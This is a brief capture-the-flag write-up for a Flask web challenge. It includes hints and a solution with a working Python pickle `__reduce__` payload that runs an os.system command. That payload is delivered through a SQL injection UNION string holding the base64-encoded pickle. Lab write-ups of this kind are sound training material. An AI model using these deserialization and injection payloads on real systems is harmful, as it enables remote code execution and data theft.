# Skills involved: Python

This is a very easy challenge. I'm jotting this down because it took me longer than expected, due to me not being familiar with Flask templates.

<details>
  <summary> Hint 1: </summary>
  
  With minimal googling you should know the potential vector.
</details>
<details>
  <summary> Hint 2: </summary>
  
  After you built the payload, how and where can it be used?
</details>
<details>
  <summary> <b>Solution:</b> </summary>
  
  <br/>
  
  Python pickles are notorious for having the `__reduce__` method for easy code execution. In case you don't know what Python pickles are, here's [a simple guide from Snyk](https://snyk.io/blog/guide-to-python-pickle/)
  ).
 
  
  An example payload can be easily created, modifying [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md).
  
```py
import pickle, os
from base64 import b64encode

class Evil(object):
    def __reduce__(self):
        return (os.system,("cp /app/flag.txt /app/application/static",))

e = Evil()
evil_token = b64encode(pickle.dumps(e))
```
  
  It took me some time to understand how the flask application works, but basically it pickles all individual entries and pipe the `data` field to depickle it.
  
  There's a SQL injection entry point as well. At first I tried to insert an item and got *you can only execute 1 statement at a time* error. Fortunately changing the selected value with `UNION` was good enough.
  
  **Final payload**: `5' UNION SELECT 'gASVQwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjChjcCAvYXBwL2ZsYWcudHh0IC9hcHAvYXBwbGljYXRpb24vc3RhdGljlIWUUpQu';--`
</details>
